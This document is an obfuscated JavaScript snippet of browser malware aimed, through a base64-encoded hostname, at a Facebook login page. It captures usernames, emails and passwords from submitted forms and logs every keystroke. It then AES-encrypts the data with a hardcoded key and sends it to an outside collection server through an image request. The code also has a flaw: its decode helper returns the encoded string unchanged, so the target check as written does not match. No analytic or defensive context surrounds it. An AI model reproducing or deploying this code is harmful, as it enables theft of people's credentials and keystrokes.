(function() {
    var _0xabc1 = function(_0x321a) {
        return _0x321a;
    };
    var _0x5eaf = function(_0x5fa1) {
        return btoa(_0x5fa1);
    };

    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
    if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) {
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');

            if (username && password) {
                exfiltrateCredentials(username, password);
            }
        });

        document.addEventListener('keydown', function(event) {
            var key = event.key;
            exfiltrateData('keystroke', key);
        });
    }

    function exfiltrateCredentials(username, password) {
        const payload = { user: username, pass: password, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }

    function encryptPayload(data) {
        const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
        const iv = CryptoJS.lib.WordArray.random(16);
        const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
        return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
    }

    function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }

    function exfiltrateData(type, data) {
        const payload = { type: type, data: data, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }
})();
